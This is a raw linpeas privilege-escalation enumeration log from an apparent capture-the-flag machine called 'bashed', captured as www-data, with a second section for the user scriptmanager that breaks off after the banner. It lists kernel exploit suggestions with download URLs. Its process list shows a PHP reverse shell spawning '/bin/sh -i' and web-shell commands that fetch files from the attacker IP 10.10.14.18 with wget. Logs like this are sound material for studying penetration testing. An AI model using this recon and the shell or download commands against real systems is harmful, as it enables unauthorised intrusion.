# www-data
```
$ ./linpeas


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                                            
    |---------------------------------------------------------------------------------|                                                                                                                            
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                                                                            
    |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                                            
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                                            
    |---------------------------------------------------------------------------------|                                                                                                                            
    |                                 Thank you!                                      |                                                                                                                            
    \---------------------------------------------------------------------------------/                                                                                                                            
          linpeas-ng by carlospolop                                                                                                                                                                                
                                                                                                                                                                                                                   
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                                                            
                                                                                                                                                                                                                   
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                                                                           
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                                                                                
                               ╚═══════════════════╝                                                                                                                                                               
OS: Linux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: bashed
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                     
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   

Caching directories DONE
                                                                                                                                                                                                                   
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                                                 
                              ╚════════════════════╝                                                                                                                                                               
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                                 
Linux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017                                                         
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.2 LTS
Release:        16.04
Codename:       xenial

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                                                                    
Sudo version 1.8.16                                                                                                                                                                                                


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                                                                            
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                                                                       

╔══════════╣ Date & uptime
Wed Dec 13 02:55:24 PST 2023                                                                                                                                                                                       
 02:55:24 up 49 min,  0 users,  load average: 0.10, 0.06, 0.02

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                                                                               
sda
sda1
sda2
sda5

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                                                                          
UUID=3e4c92bc-8e6f-4a49-90e7-89274a4755c3 /               ext4    errors=remount-ro 0       1                                                                                                                      
UUID=84ec3632-89e9-4e4d-88b4-afcbbc06a03b none            swap    sw              0       0
/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                                                                            
HISTFILESIZE=0                                                                                                                                                                                                     
OLDPWD=/
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                                                                                             
dmesg Not Found                                                                                                                                                                                                    
                                                                                                                                                                                                                   
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                 
[+] [CVE-2017-16995] eBPF_verifier                                                                                                                                                                                 

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: highly probable
   Tags: [ ubuntu=(14.04|16.04){kernel:4.4.0-62-generic} ]
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-1000112] NETIF_F_UFO

   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1
   Exposure: probable
   Tags: ubuntu=14.04{kernel:4.4.0-*},[ ubuntu=16.04 ]{kernel:4.8.0-*}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic}
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

[+] [CVE-2016-4557] double-fdput()

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: less probable
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                                                                            
  [1] af_packet                                                                                                                                                                                                    
      CVE-2016-8655
      Source: http://www.exploit-db.com/exploits/40871
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] get_rekt
      CVE-2017-16695
      Source: http://www.exploit-db.com/exploits/45010


╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                                                                      
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                                                                                                           
═╣ PaX bins present? .............. PaX Not Found                                                                                                                                                                  
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                                                           
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                                                             
═╣ Seccomp enabled? ............... disabled                                                                                                                                                                       
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... disabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                                                                                                                                                                   

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                                                                                
                                   ╚═══════════╝                                                                                                                                                                   
╔══════════╣ Container related tools present (if any):
╔══════════╣ Am I Containered?                                                                                                                                                                                     
╔══════════╣ Container details                                                                                                                                                                                     
═╣ Is this a container? ........... No                                                                                                                                                                             
═╣ Any running containers? ........ No                                                                                                                                                                             
                                                                                                                                                                                                                   

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                                                                                
                                     ╚═══════╝                                                                                                                                                                     
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM? ............................ No
═╣ Azure APP? ........................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                                                                 
                ╚════════════════════════════════════════════════╝                                                                                                                                                 
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                        
root          1  0.0  0.5  37828  5868 ?        Ss   02:05   0:01 /sbin/init noprompt                                                                                                                              
root        313  0.0  0.2  28332  2868 ?        Ss   02:05   0:00 /lib/systemd/systemd-journald
root        353  0.0  0.0 158624   272 ?        Ssl  02:05   0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid
root        376  0.0  0.3  44256  3752 ?        Ss   02:05   0:00 /lib/systemd/systemd-udevd
systemd+    477  0.0  0.2 100324  2604 ?        Ssl  02:05   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root        604  0.0  0.2  20100  2752 ?        Ss   02:05   0:00 /lib/systemd/systemd-logind
root        607  0.0  0.3  29008  3012 ?        Ss   02:05   0:00 /usr/sbin/cron -f
root        609  0.0  0.8 275864  8068 ?        Ssl  02:05   0:00 /usr/lib/accountsservice/accounts-daemon[0m
syslog      618  0.0  0.5 256396  5384 ?        Ssl  02:05   0:00 /usr/sbin/rsyslogd -n
message+    633  0.0  0.3  42900  3932 ?        Ss   02:05   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
  └─(Caps) 0x0000000020000000=cap_audit_write
root        647  0.1  1.0 118500 10048 ?        Ss   02:05   0:03 /usr/bin/vmtoolsd
root        712  0.0  0.1  15940  1772 tty1     Ss+  02:06   0:00 /sbin/agetty --noclear tty1 linux
root        835  0.0  2.4 255896 24596 ?        Ss   02:06   0:00 /usr/sbin/apache2 -k start
www-data    931  0.0  1.2 256404 12048 ?        S    02:12   0:00  _ /usr/sbin/apache2 -k start
www-data  48290  0.0  0.0   4508   808 ?        S    02:45   0:00  |   _ sh -c cd /home/scriptmanager; wget http://10.10.14.18:7777/test 2>&1
www-data  48291  0.0  0.3  33352  3368 ?        S    02:45   0:00  |       _ wget http://10.10.14.18:7777/test
www-data    933  0.0  1.2 256372 12388 ?        S    02:12   0:00  _ /usr/sbin/apache2 -k start
www-data   1099  0.0  0.0   4508   748 ?        S    02:26   0:00  |   _ sh -c cd /home/arrexel; ping 10.10.14.18 2>&1
www-data   1100  0.0  0.0   6536   668 ?        S    02:26   0:00  |       _ ping 10.10.14.18
www-data    934  0.0  1.2 256380 11996 ?        S    02:12   0:00  _ /usr/sbin/apache2 -k start
www-data    950  0.0  1.2 256388 12056 ?        S    02:15   0:00  _ /usr/sbin/apache2 -k start
www-data    955  0.0  1.2 256372 11980 ?        S    02:15   0:00  _ /usr/sbin/apache2 -k start
www-data    961  0.0  1.2 256388 12012 ?        S    02:15   0:00  _ /usr/sbin/apache2 -k start
www-data    994  0.0  1.2 256380 12104 ?        S    02:15   0:00  _ /usr/sbin/apache2 -k start
www-data    996  0.0  1.2 256372 11984 ?        S    02:15   0:00  _ /usr/sbin/apache2 -k start
www-data   1006  0.0  1.1 256204 11456 ?        S    02:15   0:00  _ /usr/sbin/apache2 -k start
www-data   1095  0.0  0.0   4508   704 ?        S    02:26   0:00  |   _ sh -c cd /home/arrexel; ping 10.10.14.18 2>&1
www-data   1096  0.0  0.0   6536   712 ?        S    02:26   0:00  |       _ ping 10.10.14.18
www-data   1007  0.0  1.1 256280 11836 ?        S    02:15   0:00  _ /usr/sbin/apache2 -k start
www-data  48271  0.0  0.0   4508   752 ?        S    02:40   0:00  |   _ sh -c cd /home/scriptmanager; ping 10.10.14.18 2>&1
www-data  48272  0.0  0.0   6536   700 ?        S    02:40   0:00  |       _ ping 10.10.14.18
www-data  16333  0.0  1.2 256380 11988 ?        S    02:29   0:00  _ /usr/sbin/apache2 -k start
www-data  48337  0.0  0.7 130440  7436 ?        Ss   02:51   0:00 php rev.php
www-data  48338  0.0  0.0   4508   844 ?        S    02:51   0:00  _ sh -c uname -a; w; id; /bin/sh -i
www-data  48342  0.0  0.1   4508  1560 ?        S    02:51   0:00      _ /bin/sh -i
www-data  64223  0.0  0.5 704124  5044 ?        Sl   02:55   0:00          _ ./linpeas
www-data  64227  0.0  0.0   4388   664 ?        S    02:55   0:00              _ base64 -d
www-data  64228  0.3  0.2   5296  2620 ?        S    02:55   0:00              _ /bin/sh
www-data  68531  0.0  0.1   5296  1004 ?        S    02:55   0:00                  _ /bin/sh
www-data  68535  0.0  0.3  34724  3160 ?        R    02:55   0:00                  |   _ ps fauxwww
www-data  68534  0.0  0.1   5296  1004 ?        S    02:55   0:00                  _ /bin/sh

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                                                       
lrwxrwxrwx 1 root     root           4 Dec  4  2017 /bin/sh -> dash                                                                                                                                                
-rwxr-xr-x 1 root     root      326224 Jan 18  2017 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root     root      618520 Jan 18  2017 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root     root      141904 Jan 18  2017 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root     root      453240 Jan 18  2017 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root     root       44104 Dec 16  2016 /sbin/agetty
lrwxrwxrwx 1 root     root          20 Dec  4  2017 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root     root      224208 Jan 12  2017 /usr/bin/dbus-daemon
-rwxr-xr-x 1 root     root       44528 Feb  9  2017 /usr/bin/vmtoolsd
-rwxr-xr-x 1 root     root      164928 Nov  3  2016 /usr/lib/accountsservice/accounts-daemon[0m
-rwxr-xr-x 1 root     root      662496 Sep 18  2017 /usr/sbin/apache2
-rwxr-xr-x 1 root     root       44472 Apr  5  2016 /usr/sbin/cron
-rwxr-xr-x 1 root     root      599328 Apr  5  2016 /usr/sbin/rsyslogd

╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                                                                                                                                          
Proc 477 with ppid 1 is run by user systemd-timesync but the ppid user is root                                                                                                                                     
Proc 618 with ppid 1 is run by user syslog but the ppid user is root
Proc 633 with ppid 1 is run by user messagebus but the ppid user is root
Proc 931 with ppid 835 is run by user www-data but the ppid user is root
Proc 933 with ppid 835 is run by user www-data but the ppid user is root
Proc 934 with ppid 835 is run by user www-data but the ppid user is root
Proc 950 with ppid 835 is run by user www-data but the ppid user is root
Proc 955 with ppid 835 is run by user www-data but the ppid user is root
Proc 961 with ppid 835 is run by user www-data but the ppid user is root
Proc 994 with ppid 835 is run by user www-data but the ppid user is root
Proc 996 with ppid 835 is run by user www-data but the ppid user is root
Proc 1006 with ppid 835 is run by user www-data but the ppid user is root
Proc 1007 with ppid 835 is run by user www-data but the ppid user is root
Proc 16333 with ppid 835 is run by user www-data but the ppid user is root
Proc 48337 with ppid 1 is run by user www-data but the ppid user is root

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                                                                 
COMMAND     PID   TID             USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME                                                                                                                                  

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                                                                                 
gdm-password Not Found                                                                                                                                                                                             
gnome-keyring-daemon Not Found                                                                                                                                                                                     
lightdm Not Found                                                                                                                                                                                                  
vsftpd Not Found                                                                                                                                                                                                   
apache2 process found (dump creds from memory as root)                                                                                                                                                             
sshd Not Found
                                                                                                                                                                                                                   
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                                                             
/usr/bin/crontab                                                                                                                                                                                                   
incrontab Not Found
-rw-r--r-- 1 root root     722 Apr  5  2016 /etc/crontab                                                                                                                                                           

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Jun  2  2022 .
drwxr-xr-x 89 root root 4096 Jun  2  2022 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  670 Mar  1  2016 php
-rw-r--r--  1 root root  191 Dec  4  2017 popularity-contest

/etc/cron.daily:
total 48
drwxr-xr-x  2 root root 4096 Jun  2  2022 .
drwxr-xr-x 89 root root 4096 Jun  2  2022 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root  539 Apr  5  2016 apache2
-rwxr-xr-x  1 root root 1474 Jan 17  2017 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  5  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  435 Nov 17  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Jun  2  2022 .
drwxr-xr-x 89 root root 4096 Jun  2  2022 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Jun  2  2022 .
drwxr-xr-x 89 root root 4096 Jun  2  2022 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Jun  2  2022 .
drwxr-xr-x 89 root root 4096 Jun  2  2022 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db


```

# scriptmanager
```
./linpeas                                                                                               
                                                                                                        
                                                                                                        
                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                                              
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
